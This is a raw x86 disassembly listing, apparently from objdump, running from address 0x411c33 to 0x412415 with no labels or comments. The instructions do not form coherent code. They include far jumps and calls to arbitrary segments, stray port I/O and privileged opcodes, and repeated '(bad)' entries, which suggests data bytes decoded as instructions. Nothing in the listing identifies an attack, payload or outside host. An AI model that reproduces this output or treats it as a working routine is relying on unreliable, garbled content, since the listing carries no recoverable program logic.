  411c33:	and    BYTE PTR [edx],dh
  411c35:	in     al,dx
  411c36:	bound  edx,QWORD PTR [ecx]
  411c38:	and    eax,0x72675b13
  411c3d:	jge    0x411c5c
  411c3f:	and    edx,DWORD PTR [ecx-0x7b]
  411c42:	das    
  411c43:	fisubr DWORD PTR [ebp+0x2adec2c2]
  411c49:	xchg   esp,eax
  411c4a:	mov    cl,0xb8
  411c4c:	adc    ecx,esi
  411c4e:	in     eax,dx
  411c4f:	push   cs
  411c50:	rol    DWORD PTR ds:0xb1bb1616,0x73
  411c57:	cmp    BYTE PTR [ebx-0x350397],dl
  411c5d:	or     ecx,DWORD PTR ds:0x2e225726
  411c63:	fld    DWORD PTR [eax]
  411c65:	sahf   
  411c66:	mov    dl,0x0
  411c68:	in     al,0xa7
  411c6a:	add    BYTE PTR [ebx],ah
  411c6c:	retf   0x1435
  411c6f:	fcom   QWORD PTR [esi]
  411c71:	sub    ah,dl
  411c73:	dec    edx
  411c74:	mov    edx,0xc0a0cabc
  411c79:	mov    dh,0x0
  411c7b:	mov    ch,0x8c
  411c7d:	xor    DWORD PTR [eax+0x1e],esi
  411c80:	mov    eax,ds:0x7114db51
  411c85:	mov    ds:0xff559cb1,eax
  411c8a:	fimul  WORD PTR [edi-0x5c]
  411c8d:	jl     0x411cda
  411c8f:	ins    DWORD PTR es:[edi],dx
  411c90:	jmp    0xe52f9bd7
  411c95:	or     BYTE PTR [edi],dh
  411c97:	push   cs
  411c98:	fisub  DWORD PTR [ecx-0x5564bacb]
  411c9e:	mov    bl,0xf3
  411ca0:	cs xchg esi,esp
  411ca3:	jb     0x411cf0
  411ca5:	pop    ebx
  411ca6:	pop    ebx
  411ca7:	mov    eax,0xd3745ca1
  411cac:	loopne 0x411d22
  411cae:	(bad)  
  411caf:	jg     0x411ce0
  411cb1:	leave  
  411cb2:	mov    edx,0x6e6c2c6d
  411cb7:	push   cs
  411cb8:	jl     0x411d0d
  411cba:	adc    eax,0xc744a17c
  411cbf:	fld    TBYTE PTR [ebp+0x57afd829]
  411cc5:	or     DWORD PTR [ebp+eax*1+0x2c],edi
  411cc9:	xchg   edi,eax
  411cca:	mov    ecx,0xadd50359
  411ccf:	ins    DWORD PTR es:[edi],dx
  411cd0:	xor    bh,BYTE PTR [edi+0x41]
  411cd3:	fwait
  411cd4:	or     edx,esi
  411cd6:	je     0x411c60
  411cd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cd9:	in     eax,dx
  411cda:	inc    edx
  411cdb:	add    eax,0x35645b40
  411ce0:	and    BYTE PTR [esi+edi*4],dl
  411ce3:	push   ecx
  411ce4:	or     ebx,ebx
  411ce6:	es jbe 0x411c94
  411ce9:	pop    esp
  411cea:	in     al,dx
  411ceb:	sar    edx,0xcb
  411cee:	ret    0xb5b6
  411cf1:	sar    BYTE PTR [edx+0x4975dc36],1
  411cf7:	xchg   edi,eax
  411cf8:	push   0x1b8d6a6b
  411cfd:	fcmovnbe st,st(6)
  411cff:	jbe    0x411d4d
  411d01:	cmp    al,0x2c
  411d03:	in     eax,0x69
  411d05:	adc    edi,DWORD PTR [esi]
  411d07:	cld    
  411d08:	add    al,0xb0
  411d0a:	push   eax
  411d0b:	mov    ah,0x8d
  411d0d:	mov    al,0xde
  411d0f:	lds    eax,FWORD PTR ss:[esi]
  411d12:	loopne 0x411cea
  411d14:	das    
  411d15:	inc    ebx
  411d16:	mov    bl,0x35
  411d18:	ret    0xb2f6
  411d1b:	add    al,0x6a
  411d1d:	mov    ebx,0xc95176a2
  411d22:	jne    0x411d57
  411d24:	enter  0xda8c,0x9e
  411d28:	jbe    0x411d3a
  411d2a:	fisttp QWORD PTR [esi-0x55d735]
  411d30:	dec    edx
  411d31:	adc    al,0x4c
  411d33:	cmp    al,0xf0
  411d35:	or     DWORD PTR [esi-0x11604375],0xb4b95a74
  411d3f:	mov    ah,0x6d
  411d41:	pop    ebx
  411d42:	out    0x71,eax
  411d44:	xor    eax,0x32420bc0
  411d49:	rol    DWORD PTR ds:0x2806dada,1
  411d4f:	call   0x2722954f
  411d54:	push   esi
  411d55:	mov    cl,BYTE PTR [esi-0x9f5635e]
  411d5b:	call   0x6c6ed16e
  411d60:	fstp   TBYTE PTR [edx-0x1d]
  411d63:	mov    bl,0x47
  411d65:	repz add DWORD PTR [eax+0x6db76144],ecx
  411d6c:	mov    eax,ds:0x1dcdd105
  411d71:	(bad)  
  411d72:	xor    edi,DWORD PTR [esp+ecx*1+0x5744ba14]
  411d79:	ins    DWORD PTR es:[edi],dx
  411d7a:	push   0xfde88547
  411d7f:	lahf   
  411d80:	inc    ebp
  411d81:	(bad)  
  411d82:	ss loope 0x411d87
  411d85:	cwde   
  411d86:	dec    ecx
  411d87:	ja     0x411d67
  411d89:	sti    
  411d8a:	stos   BYTE PTR es:[edi],al
  411d8b:	fcomp  QWORD PTR [edx+0x1]
  411d8e:	fist   DWORD PTR [esi+0x4d]
  411d91:	jno    0x411d23
  411d93:	cmp    BYTE PTR [edx-0x36],cl
  411d96:	pop    ebx
  411d97:	or     ebx,DWORD PTR [ebx+0x13]
  411d9a:	adc    DWORD PTR [edx+0x59],ecx
  411d9d:	jl     0x411d27
  411d9f:	inc    eax
  411da0:	ins    DWORD PTR es:[edi],dx
  411da1:	clc    
  411da2:	ins    DWORD PTR es:[edi],dx
  411da3:	push   ebp
  411da4:	scas   al,BYTE PTR es:[edi]
  411da5:	sbb    BYTE PTR [edi+ebx*1],0x53
  411da9:	push   edx
  411daa:	mov    ds:0xe6b6c1d0,eax
  411daf:	xor    eax,0xd8cbc8da
  411db4:	popa   
  411db5:	add    DWORD PTR [ebx-0x2b],0xe8f7616d
  411dbc:	sub    BYTE PTR [edi],0x40
  411dbf:	ror    DWORD PTR [esi+0x5b8a06d6],1
  411dc5:	xor    al,ah
  411dc7:	mov    ch,0x6a
  411dc9:	jns    0x411e1d
  411dcb:	fcmovnu st,st(4)
  411dcd:	sub    ch,BYTE PTR [edi+edx*4-0x26]
  411dd1:	xchg   esi,eax
  411dd2:	das    
  411dd3:	adc    al,0x7b
  411dd5:	mov    eax,0xb63766ef
  411dda:	sub    eax,0xf404dc3d
  411ddf:	dec    ebp
  411de0:	pop    ds
  411de1:	lea    ebx,[eax-0x104664d6]
  411de7:	mov    dh,0xe
  411de9:	call   0x8fb137b0
  411dee:	shl    ch,cl
  411df0:	dec    ebp
  411df1:	and    BYTE PTR [ebx],bl
  411df3:	sub    eax,0x77dadf2d
  411df8:	mov    ecx,0x53529a
  411dfd:	into   
  411dfe:	or     BYTE PTR ds:0xb6d2dba7,al
  411e04:	mov    al,0xfe
  411e06:	lock jns 0x411e31
  411e09:	or     eax,DWORD PTR [ebx]
  411e0b:	push   esi
  411e0c:	(bad)  
  411e0d:	retf   
  411e0e:	lahf   
  411e0f:	stos   DWORD PTR es:[edi],eax
  411e10:	push   ebp
  411e11:	sbb    eax,DWORD PTR [ebp+0x415d6da0]
  411e17:	(bad)  
  411e18:	push   edx
  411e19:	test   al,0xdb
  411e1b:	bnd jbe 0x411deb
  411e1e:	inc    edx
  411e1f:	cmp    bl,0x0
  411e22:	sbb    DWORD PTR [ebx+0x14],edi
  411e25:	lds    esi,FWORD PTR [edi-0x80]
  411e28:	fimul  DWORD PTR [ebp-0x2dea7fda]
  411e2e:	xchg   ecx,ebx
  411e30:	push   cs
  411e31:	outs   dx,BYTE PTR ds:[esi]
  411e32:	add    eax,0x52c4dabc
  411e37:	adc    BYTE PTR [ebx-0x1f74dd37],0x46
  411e3e:	(bad)  [edx]
  411e40:	xchg   edx,eax
  411e41:	push   0xad8c3bed
  411e46:	lods   eax,DWORD PTR ds:[esi]
  411e47:	test   DWORD PTR [edx+0x737081b5],esi
  411e4d:	add    eax,0x6910aa5b
  411e52:	stc    
  411e53:	sbb    ebx,ebx
  411e55:	pop    esp
  411e56:	fidiv  DWORD PTR ds:0xce0676
  411e5c:	pop    ebx
  411e5d:	arpl   WORD PTR [eax],ax
  411e5f:	cmp    esp,edx
  411e61:	sub    DWORD PTR [ecx+0x47],0xffffffd1
  411e65:	ins    DWORD PTR es:[edi],dx
  411e66:	or     BYTE PTR [ebx],0x12
  411e69:	test   BYTE PTR [esi-0x33],dh
  411e6c:	sbb    eax,0xc0c97062
  411e71:	inc    esi
  411e72:	test   al,0x38
  411e74:	or     DWORD PTR [edx+0x412f0a70],edx
  411e7a:	ins    DWORD PTR es:[edi],dx
  411e7b:	dec    ebp
  411e7c:	inc    edi
  411e7d:	out    dx,eax
  411e7e:	jp     0x411ee7
  411e80:	mov    edi,0x63f50023
  411e85:	or     ebx,DWORD PTR [eax+ebx*4]
  411e88:	xchg   ecx,eax
  411e89:	mov    esp,0x170067c7
  411e8e:	push   ss
  411e8f:	mov    dh,0x6d
  411e91:	sbb    cl,BYTE PTR [ecx+esi*2+0x3adf0c11]
  411e98:	call   0x42cb:0x172973f
  411e9f:	lds    ebx,FWORD PTR [ebx+0x6b620656]
  411ea5:	pop    ss
  411ea6:	sbb    al,BYTE PTR [ecx+0x62]
  411ea9:	push   ss
  411eaa:	aam    0x6b
  411eac:	push   cs
  411ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411eae:	fnstenv [esi-0x5af4a4f5]
  411eb4:	xchg   ebp,eax
  411eb5:	xchg   BYTE PTR [esi],dl
  411eb7:	test   DWORD PTR [ebp-0x4929ce68],edx
  411ebd:	mov    al,0xd0
  411ebf:	cmp    BYTE PTR [edx],bh
  411ec1:	pop    ebp
  411ec2:	or     al,BYTE PTR [ebp-0x1d]
  411ec5:	aam    0x46
  411ec7:	sub    BYTE PTR [edi],bh
  411ec9:	xchg   esi,eax
  411eca:	push   esi
  411ecc:	pop    ds
  411ecd:	add    BYTE PTR [esi+0x48260032],bl
  411ed3:	add    dl,BYTE PTR [ebp+edi*8-0x20]
  411ed7:	mov    cl,BYTE PTR [ebx-0x35]
  411eda:	pop    ss
  411edb:	and    al,0xba
  411edd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ede:	add    BYTE PTR [edi-0x76d7c82],bl
  411ee4:	mov    eax,0x12bb4135
  411ee9:	scas   al,BYTE PTR es:[edi]
  411eea:	ds in  al,0x4b
  411eed:	mov    dh,0xff
  411eef:	jmp    0x3381:0x83945b85
  411ef6:	mov    eax,0x26d4a9e9
  411efb:	mov    cl,BYTE PTR [ebx-0x1a]
  411efe:	shl    esi,1
  411f00:	and    al,bh
  411f02:	aam    0x63
  411f04:	imul   edx,DWORD PTR [eax+0xd],0x69
  411f08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f09:	adc    DWORD PTR [ecx],0x7b
  411f0c:	jmp    0x60a9:0x76c0535b
  411f13:	jp     0x411f6e
  411f15:	fmul   QWORD PTR [ecx+edx*8]
  411f18:	fstp   DWORD PTR [ebx+0x51]
  411f1b:	mov    ebx,0x83e74a6d
  411f20:	out    0xd,al
  411f22:	frstor [edx]
  411f24:	jae    0x411f86
  411f26:	popa   
  411f27:	pop    ebx
  411f28:	push   0x203dd9b9
  411f2d:	mov    edi,0x585f493a
  411f32:	outs   dx,BYTE PTR ds:[esi]
  411f33:	test   ebp,esi
  411f35:	adc    ecx,ebp
  411f37:	xor    al,BYTE PTR [ebx]
  411f39:	rcr    BYTE PTR [esi+0x0],1
  411f3c:	pop    esi
  411f3d:	sub    DWORD PTR [edx-0x75],ebp
  411f40:	pusha  
  411f41:	sub    esp,DWORD PTR [eax+eiz*2-0x77ebacfb]
  411f48:	test   DWORD PTR [esi-0x6eb0b3c8],ebp
  411f4e:	addr16 inc edx
  411f50:	popa   
  411f51:	fld    TBYTE PTR [esi]
  411f53:	dec    ecx
  411f54:	and    DWORD PTR [edi],0x29
  411f57:	jbe    0x411f61
  411f59:	mov    cl,BYTE PTR [edx]
  411f5b:	sub    ecx,DWORD PTR [ebp-0x4e3d177a]
  411f61:	jmp    0x411fb1
  411f63:	shr    DWORD PTR [edi+0x2156675],0xda
  411f6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f6b:	imul   ecx
  411f6d:	int    0x6d
  411f6f:	add    BYTE PTR [esi],0x54
  411f72:	fidiv  DWORD PTR [esi]
  411f74:	outs   dx,BYTE PTR cs:[esi]
  411f76:	dec    ebp
  411f77:	test   eax,0x504ace72
  411f7c:	inc    edi
  411f7d:	fcmovnb st,st(2)
  411f7f:	push   edx
  411f80:	mov    ebx,0xceb8a671
  411f85:	pop    ecx
  411f86:	and    al,0x34
  411f88:	(bad)  
  411f89:	xlat   BYTE PTR ds:[ebx]
  411f8a:	mov    dl,0xb6
  411f8c:	fstp   QWORD PTR [edx+0x4fb98a2]
  411f92:	inc    esp
  411f93:	jbe    0x411f36
  411f95:	add    eax,0xb5b54a5f
  411f9a:	xchg   ebp,eax
  411f9b:	xor    BYTE PTR [eax+ebp*2],0xd
  411f9f:	test   DWORD PTR [eax-0x47f593d4],eax
  411fa5:	aaa    
  411fa6:	adc    eax,0x9ca78898
  411fab:	shl    DWORD PTR [ecx-0x493be897],cl
  411fb1:	mov    al,ds:0x5a235f2
  411fb6:	jle    0x411fe1
  411fb8:	popa   
  411fb9:	test   eax,0xdbcb52fc
  411fbe:	and    al,BYTE PTR [eax]
  411fc0:	and    dl,bh
  411fc2:	mov    ecx,0xedb16a14
  411fc7:	pop    esp
  411fc8:	jno    0x412020
  411fca:	jno    0x41202f
  411fcc:	sti    
  411fcd:	sahf   
  411fce:	pop    esp
  411fcf:	pop    ecx
  411fd0:	push   ebx
  411fd1:	sbb    ebp,DWORD PTR [ebp-0x25]
  411fd4:	adc    eax,0x234e80c2
  411fd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fda:	dec    ebp
  411fdb:	pushf  
  411fdc:	push   ss
  411fdd:	lods   eax,DWORD PTR ds:[esi]
  411fde:	mov    DWORD PTR [esi],ebp
  411fe0:	mov    ah,0xe8
  411fe2:	jp     0x412006
  411fe4:	ja     0x114fedcb
  411fea:	pop    ss
  411feb:	ss mov dh,0x40
  411fee:	into   
  411fef:	call   0xc40b:0x6e7cb578
  411ff6:	ins    DWORD PTR es:[edi],dx
  411ff7:	add    ebx,DWORD PTR [eax+eiz*8-0x52]
  411ffb:	scas   eax,DWORD PTR es:[edi]
  411ffc:	fnsave [ecx]
  411ffe:	bound  esi,QWORD PTR [eax+0x6e4d6ed0]
  412004:	jle    0x412083
  412006:	not    DWORD PTR [eax]
  412008:	pop    ss
  412009:	shr    DWORD PTR [esi+esi*1],0xb3
  41200d:	mov    ah,0xb1
  41200f:	and    al,0x90
  412012:	mov    al,ds:0xa1b33ee0
  412017:	cdq    
  412018:	loop   0x412031
  41201a:	xchg   esi,eax
  41201b:	mov    eax,ds:0x44354c2b
  412020:	add    BYTE PTR [edi],dh
  412022:	clc    
  412023:	sbb    DWORD PTR [ecx+0x2c02d6e2],ebp
  412029:	(bad)  
  41202a:	lods   al,BYTE PTR ds:[esi]
  41202b:	loop   0x411fb9
  41202d:	add    al,0xb
  41202f:	test   DWORD PTR ds:0xdf8a6ea2,ecx
  412035:	sub    BYTE PTR [ecx],bl
  412037:	dec    BYTE PTR [ebx]
  412039:	aam    0xb6
  41203b:	mov    ch,0x3a
  41203d:	xchg   BYTE PTR [esi+ecx*1],ch
  412040:	rol    DWORD PTR [ebp-0x5e],1
  412043:	imul   esp,DWORD PTR [ebp+0x356da16d],0xca6a8c8a
  41204d:	xor    eax,0xdb6cb08b
  412052:	lea    eax,[ebp+0x21b3d68a]
  412058:	fmul   st,st(5)
  41205a:	xchg   edx,eax
  41205b:	out    dx,al
  41205c:	sbb    cl,BYTE PTR [eax]
  41205e:	jbe    0x4120b4
  412060:	pop    ebp
  412061:	push   0xc67279ab
  412066:	mul    bl
  412068:	js     0x4120bb
  41206a:	jmp    0x412026
  41206c:	or     BYTE PTR [ebx+0x10],dl
  41206f:	fcmovbe st,st(2)
  412071:	bnd ret 
  412073:	inc    eax
  412074:	fisttp QWORD PTR [edx+0x5f]
  412077:	and    edi,DWORD PTR [ecx+edx*2-0x494973bb]
  41207e:	fiadd  DWORD PTR [esi+0x63]
  412081:	or     DWORD PTR [ebx-0x3780cbe1],esi
  412087:	push   esp
  412088:	fstp   st(0)
  41208a:	ficomp DWORD PTR [esi+0x48bac1f9]
  412090:	cdq    
  412091:	cmp    ecx,edx
  412093:	das    
  412094:	mov    al,0x35
  412096:	call   0xe743:0xf6f705ee
  41209d:	add    BYTE PTR [edi],dh
  41209f:	cdq    
  4120a0:	mov    dh,0xb5
  4120a2:	or     dl,BYTE PTR [esi+0x659d9cef]
  4120a8:	daa    
  4120a9:	imul   ebp,DWORD PTR ds:0xb0db6d14,0x59
  4120b0:	jmp    0xa2eb:0x3afb09d7
  4120b7:	outs   dx,BYTE PTR ds:[esi]
  4120b8:	jl     0x41211b
  4120ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120bb:	mov    bh,0x54
  4120bd:	faddp  st(5),st
  4120c0:	cwde   
  4120c1:	outs   dx,BYTE PTR ds:[esi]
  4120c2:	pop    ebx
  4120c3:	add    esp,DWORD PTR [eax+0x40]
  4120c6:	aad    0x47
  4120c8:	sub    dh,BYTE PTR ds:0xdb741b51
  4120ce:	mov    dh,0xaf
  4120d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120d1:	pop    ecx
  4120d2:	add    eax,0x20bd2687
  4120d7:	test   BYTE PTR [ebx+0x170ab71a],bh
  4120dd:	push   ebx
  4120de:	inc    ebp
  4120df:	xor    bl,BYTE PTR [edi-0x248bef1f]
  4120e5:	push   ss
  4120e6:	imul   DWORD PTR [ebp+0x75]
  4120e9:	out    0xd4,al
  4120eb:	sti    
  4120ec:	repz push edi
  4120ee:	ins    DWORD PTR es:[edi],dx
  4120ef:	mov    ebx,0xe016eed4
  4120f4:	mov    ds:0xcb61778b,al
  4120f9:	loopne 0x412091
  4120fb:	mov    dh,0xc6
  4120fd:	and    eax,0x185d3980
  412102:	sbb    dh,BYTE PTR [esi-0x7d]
  412105:	sbb    dh,BYTE PTR [esi+0x61]
  412108:	popa   
  412109:	fist   DWORD PTR [edx+0x61d46b0f]
  41210f:	mov    edi,0x41bc0b7f
  412114:	pop    edx
  412115:	pop    edx
  412116:	fdiv   DWORD PTR [esi+0x66b5f95]
  41211c:	fsubr  QWORD PTR [ebp+0x1b85aad7]
  412122:	pop    ebx
  412123:	add    eax,DWORD PTR [ebx+0x17]
  412126:	dec    edi
  412127:	lahf   
  412128:	sbb    DWORD PTR [ecx-0x2a4bb2c9],ecx
  41212e:	dec    edx
  41212f:	jge    0x41214f
  412131:	les    eax,FWORD PTR [ecx+0x401d5eea]
  412137:	fwait
  412138:	cmp    BYTE PTR [eax],0xa5
  41213b:	imul   esi,DWORD PTR [edi]
  41213e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41213f:	sbb    ebx,DWORD PTR [ebx]
  412141:	lea    ecx,[ebx]
  412143:	icebp  
  412144:	push   ebp
  412145:	jl     0x4121bc
  412147:	daa    
  412148:	ja     0x41211c
  41214a:	lahf   
  41214b:	pop    eax
  41214c:	mov    al,ds:0x2f1788ed
  412151:	sbb    DWORD PTR [edx],0x59
  412154:	adc    dl,al
  412156:	fstp   TBYTE PTR [edx-0x7d757a7e]
  41215c:	cmp    ecx,DWORD PTR [ecx]
  41215e:	inc    edi
  41215f:	push   ss
  412160:	mov    edi,0x6ddb1a16
  412165:	lods   eax,DWORD PTR ds:[esi]
  412166:	jge    0x412109
  412168:	ret    
  412169:	push   esi
  41216a:	and    DWORD PTR [edi+0x4],ebp
  41216d:	inc    edx
  41216e:	imul   esp,DWORD PTR [ebx-0x4468e923],0xffffff89
  412175:	nop
  412176:	out    0x6b,al
  412178:	dec    eax
  412179:	xchg   ebx,eax
  41217a:	fsubr  QWORD PTR [esi+0x1b]
  41217d:	or     eax,0x7478075
  412182:	xor    ebx,DWORD PTR [edx+0x21]
  412185:	mov    dh,0x86
  412187:	mov    al,0x56
  412189:	inc    ecx
  41218a:	mov    ebx,0xdbf2b2b5
  41218f:	js     0x4121f0
  412191:	int    0x20
  412193:	or     dh,BYTE PTR ss:[edi+0x55b40b23]
  41219a:	mov    cl,0x53
  41219c:	push   ebp
  41219d:	fist   DWORD PTR [esi+0x5b]
  4121a0:	xchg   esp,eax
  4121a1:	mov    ebp,0x44e90186
  4121a6:	loope  0x4121df
  4121a8:	test   al,0xbc
  4121aa:	mov    ah,0xf7
  4121ac:	in     al,dx
  4121ad:	shr    DWORD PTR [esi+0x0],1
  4121b0:	push   ebx
  4121b1:	es int3 
  4121b3:	mov    ds:0x68d8db6d,al
  4121b8:	adc    al,0x4e
  4121ba:	pop    edx
  4121bb:	xor    BYTE PTR [esi],bl
  4121bd:	push   ebx
  4121be:	mov    ebp,0x36dc7c23
  4121c3:	fcmove st,st(1)
  4121c5:	inc    eax
  4121c6:	jge    0x4121ce
  4121c8:	pushf  
  4121c9:	adc    al,0xe5
  4121cb:	into   
  4121cc:	sub    dl,BYTE PTR [esi+0x2d44b544]
  4121d2:	or     eax,0x6d70e57c
  4121d7:	or     ebp,DWORD PTR ds:0x971cb4d1
  4121dd:	lods   ax,WORD PTR ds:[esi]
  4121df:	sbb    BYTE PTR [edx+edi*1-0x493912bf],bh
  4121e6:	(bad)  
  4121e7:	retf   
  4121e8:	outs   dx,BYTE PTR ds:[esi]
  4121e9:	retf   
  4121ea:	stos   DWORD PTR es:[edi],eax
  4121eb:	cwde   
  4121ec:	sbb    edi,edx
  4121ee:	mov    eax,ds:0xf62db06c
  4121f3:	pop    esi
  4121f4:	sbb    DWORD PTR [ebp+0x151912e6],0xffffff8a
  4121fb:	fidiv  DWORD PTR [esi+0x4d]
  4121fe:	push   eax
  4121ff:	out    dx,eax
  412200:	dec    ebp
  412201:	add    dl,BYTE PTR [esi+0x7b]
  412204:	loop   0x4121c8
  412206:	mov    dh,0x9b
  412208:	sub    al,0x32
  41220a:	out    dx,eax
  41220b:	push   ss
  41220c:	jmp    0x54d0:0x20212885
  412213:	jno    0x412278
  412215:	pop    ebp
  412216:	inc    edi
  412218:	pusha  
  412219:	mov    edi,DWORD PTR cs:[edx-0x2491293]
  412220:	stos   DWORD PTR es:[edi],eax
  412221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412222:	icebp  
  412223:	repnz mov DWORD PTR [edi],ebp
  412226:	pop    edi
  412227:	mov    bl,0x41
  412229:	daa    
  41222a:	je     0x412287
  41222c:	call   0x4eaa9b1
  412231:	imul   DWORD PTR [eax+0x12]
  412234:	call   ecx
  412236:	outs   dx,BYTE PTR ds:[esi]
  412237:	sbb    ecx,DWORD PTR ds:0x14db0117
  41223d:	cmp    ecx,DWORD PTR [ecx]
  41223f:	dec    ebx
  412240:	mov    esp,0xbb6d6e14
  412245:	jb     0x412235
  412247:	push   0x80624314
  41224c:	and    DWORD PTR [esi],esi
  41224e:	mov    ds:0x6ed546b7,eax
  412253:	mov    cl,BYTE PTR [esi-0xda1c4e1]
  412259:	ret    0xddd5
  41225c:	mov    dh,0x6d
  41225e:	stc    
  41225f:	add    ch,cl
  412261:	call   0x41aa:0x5cdd2e00
  412268:	dec    edi
  412269:	stos   BYTE PTR es:[edi],al
  41226a:	push   ds
  41226b:	jmp    0x412223
  41226d:	in     eax,dx
  41226e:	xchg   edx,eax
  41226f:	mov    ds:0xc6a76fb3,eax
  412274:	int    0xc8
  412276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412277:	add    dl,BYTE PTR [ecx-0x49]
  41227a:	mov    dh,0xc2
  41227c:	daa    
  41227d:	xor    DWORD PTR [esi],esp
  41227f:	(bad)  [edx+0x6b]
  412282:	lahf   
  412283:	cs mov ah,0x76
  412286:	arpl   WORD PTR [ebx],ax
  412288:	fsubr  DWORD PTR [eax+0x4d]
  41228b:	push   ecx
  41228c:	push   esp
  41228d:	rcl    DWORD PTR [esi+0x2c5103e4],1
  412293:	inc    ebp
  412294:	pop    ds
  412295:	mov    dh,0xd5
  412297:	jbe    0x41221c
  412299:	mov    gs,WORD PTR [eax+0x3a]
  41229c:	jl     0x412307
  41229e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41229f:	mov    eax,ds:0x6e892157
  4122a4:	or     ebx,DWORD PTR ds:0x2e1db0c0
  4122aa:	and    al,BYTE PTR [edx+0x2d063e4d]
  4122b0:	fstp   QWORD PTR [edx]
  4122b2:	add    al,BYTE PTR [esi]
  4122b4:	mov    dh,0x95
  4122b6:	xchg   edi,eax
  4122b7:	inc    edx
  4122b8:	adc    al,0x1a
  4122ba:	mov    DWORD PTR [ebx-0x57],ebx
  4122bd:	mov    al,ds:0x613ebf2c
  4122c2:	stc    
  4122c3:	jae    0x412266
  4122c5:	ins    DWORD PTR es:[edi],dx
  4122c6:	inc    ecx
  4122c7:	pop    ebx
  4122c8:	ja     0x41233a
  4122ca:	mov    DWORD PTR [eax],esp
  4122cc:	adc    DWORD PTR [edx],edi
  4122ce:	jno    0x4122ab
  4122d0:	mov    dh,0x76
  4122d2:	fstp   DWORD PTR [eax]
  4122d4:	pop    ecx
  4122d5:	sub    BYTE PTR [ebp+ecx*2+0x4a301d84],0xb5
  4122dd:	inc    ecx
  4122de:	and    DWORD PTR [edx-0x257386e2],0xba286b56
  4122e8:	scas   eax,DWORD PTR es:[edi]
  4122e9:	dec    ebp
  4122ea:	(bad)  [ebx-0x4e3776fc]
  4122f0:	sub    eax,0x9ea6856d
  4122f5:	inc    esp
  4122f6:	cmp    DWORD PTR [edi+edi*4-0x291c9c53],0xffffffb8
  4122fe:	pop    ebp
  4122ff:	xor    eax,0x39956fcc
  412304:	mov    ecx,0x1af9ca57
  412309:	fild   DWORD PTR [edx+0x51]
  41230c:	mov    eax,ds:0x332ad174
  412311:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412312:	lods   eax,DWORD PTR ds:[esi]
  412313:	sub    eax,0x54948f97
  412318:	lahf   
  412319:	imul   ecx,DWORD PTR [edi+0x5bb5b924],0x3
  412320:	rcr    BYTE PTR ds:0x830f880f,0xf6
  412327:	xor    BYTE PTR [edi-0x53],dh
  41232a:	sub    edx,ebx
  41232c:	mov    edx,0x172ca8c
  412331:	or     esp,ebx
  412333:	fs sbb ebp,0xffffffda
  412337:	mov    dh,0xad
  412339:	dec    edx
  41233a:	dec    esp
  41233b:	cmp    al,0x6b
  41233d:	push   edi
  41233e:	push   esi
  41233f:	fs fsub st(2),st
  412342:	les    ebp,FWORD PTR [esi]
  412344:	xchg   esp,eax
  412345:	push   ss
  412346:	mov    ds:0xf263e186,al
  41234b:	and    eax,0xd436b131
  412350:	push   ss
  412351:	aad    0xfb
  412353:	pusha  
  412354:	pop    edi
  412355:	mov    dl,0x7a
  412357:	lods   al,BYTE PTR ds:[esi]
  412358:	inc    ebp
  412359:	ins    BYTE PTR es:[edi],dx
  41235a:	sub    dl,bl
  41235c:	ret    0x5019
  41235f:	pop    esp
  412360:	add    al,0xa2
  412362:	pop    ebx
  412363:	popa   
  412364:	fld    TBYTE PTR [edx-0x28]
  412367:	lds    esi,FWORD PTR [eax-0x5a0da6f]
  41236d:	cli    
  41236e:	jne    0x412371
  412370:	aaa    
  412371:	mov    edx,0x13a56ee8
  412376:	add    edi,DWORD PTR [esp+ebx*4]
  412379:	mov    dh,0x9e
  41237b:	fisubr DWORD PTR [esi]
  41237d:	in     al,dx
  41237e:	je     0x41238d
  412380:	and    edx,ebp
  412382:	ret    
  412383:	nop
  412384:	adc    ebx,DWORD PTR [edi+0x36974b1b]
  41238a:	test   BYTE PTR [ebx-0x5bb761cb],0xc9
  412391:	push   esp
  412392:	sbb    al,0x6d
  412394:	mov    BYTE PTR ds:0x29918345,cl
  41239a:	scas   al,BYTE PTR es:[edi]
  41239b:	in     eax,dx
  41239c:	adc    al,0xca
  41239e:	lea    esi,[esi-0x5d]
  4123a1:	jge    0x4123c1
  4123a3:	pusha  
  4123a4:	popa   
  4123a5:	sbb    eax,0xb6e45815
  4123aa:	sbb    ebx,DWORD PTR [ebx-0x5f]
  4123ad:	mov    dh,cl
  4123af:	adc    ch,BYTE PTR [edi-0x6e]
  4123b2:	lods   eax,DWORD PTR ds:[esi]
  4123b4:	pop    edi
  4123b5:	ret    0xeb6d
  4123b8:	mov    BYTE PTR [ecx-0x63],ch
  4123bb:	bound  edi,QWORD PTR gs:[eax]
  4123be:	ds ins BYTE PTR es:[edi],dx
  4123c0:	cmp    ch,BYTE PTR [esi]
  4123c2:	fiadd  DWORD PTR [ebp-0x44abbc7b]
  4123c8:	bnd ret 
  4123ca:	bound  ebx,QWORD PTR [edx-0x7b]
  4123cd:	lods   eax,DWORD PTR ds:[esi]
  4123ce:	and    esi,DWORD PTR [esi+0x352fa1b2]
  4123d4:	add    BYTE PTR [edi+0x2a],0x61
  4123d8:	aaa    
  4123d9:	ss fidivr DWORD PTR ss:0x53120589
  4123e1:	ret    
  4123e2:	lock cmp DWORD PTR [edx+ebx*4+0x6b7cb010],esp
  4123ea:	shl    DWORD PTR [edx],1
  4123ec:	or     cl,BYTE PTR [edx+0x0]
  4123ef:	not    BYTE PTR [ecx+0x2b6dd00d]
  4123f5:	and    eax,0x651a02bf
  4123fa:	jle    0x4123d0
  4123fc:	push   cs
  4123fd:	pop    ebx
  4123fe:	fcomp  DWORD PTR [edx+0x755437aa]
  412404:	and    edx,edi
  412406:	addr16 mov al,ds:0xdbbf
  41240a:	add    BYTE PTR [eax+eiz*2+0x68],bl
  41240e:	nop
  41240f:	or     BYTE PTR [esi+0x23ae1d72],ah
  412415:	mov    BYTE PTR [esi-0x2977949e],al
